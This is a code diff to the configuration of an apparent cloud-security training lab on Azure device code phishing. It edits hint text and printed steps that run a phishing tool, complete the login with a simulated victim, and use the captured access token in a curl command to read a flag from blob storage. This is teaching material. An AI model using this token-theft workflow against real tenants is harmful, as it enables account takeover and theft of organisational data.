@@ -18,7 +18,7 @@ class ApplicationConfiguration(ApplicationConfigurationAbstract):
     def get_hints(self):
         return {
             1: "Navigate to the lab's tools/ directory and run phish.py with your tenant domain. It initiates a device code flow and prints a realistic phishing message with the user code. Keep this terminal open — it polls for the victim's token.",
-            2: "In a second terminal, run victim_simulator.py with the user code printed by phish.py and the victim credentials provided above. It uses a headless browser to automatically complete the device code authentication as the victim (requires: pip install playwright && playwright install chromium).",
+            2: "In a second terminal (docker exec -it $(hostname) bash), run victim_simulator.py with the user code printed by phish.py and the victim credentials provided above. It uses a headless Chromium browser to automatically complete the device code authentication as the victim.",
             3: "Once phish.py prints 'TOKEN CAPTURED', use the saved token to read the flag: TOKEN=$(python3 -c \"import json; d=json.load(open('/tmp/dcp_token.json')); print(d['access_token'])\") && curl -H \"Authorization: Bearer $TOKEN\" -H \"x-ms-version: 2020-04-08\" \"https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt\"",
         }
 
@@ -42,19 +42,16 @@ class ApplicationConfiguration(ApplicationConfigurationAbstract):
         print("Open a second tab in this container:")
         print("  docker exec -it $(hostname) bash")
         print("")
-        print("Step 1 — Install the victim simulator dependency (once):")
-        print("  pip install playwright && playwright install chromium")
-        print("")
-        print("Step 2 — Terminal 1: run the phishing tool")
+        print("Step 1 — Terminal 1: run the phishing tool")
         print("  cd app/cumulonimbus/applications/azure/device_code_phishing/tools")
         print("  python3 phish.py \\")
         print("      --tenant          {} \\".format(val("domain_name")))
         print("      --victim-username {} \\".format(val("user_name")))
         print("      --victim-password '{}'".format(val("user_password")))
         print("")
-        print("Step 3 — Terminal 2: copy the victim_simulator.py command printed by phish.py and run it")
+        print("Step 2 — Terminal 2: copy the victim_simulator.py command printed by phish.py and run it")
         print("")
-        print("Step 4 — Use the captured token to read the flag:")
+        print("Step 3 — Use the captured token to read the flag:")
         print("  TOKEN=$(python3 -c \"import json; d=json.load(open('/tmp/dcp_token.json')); print(d['access_token'])\")")
         print("  curl -s -H \"Authorization: Bearer $TOKEN\" \\")
         print("       -H \"x-ms-version: 2020-04-08\" \\")
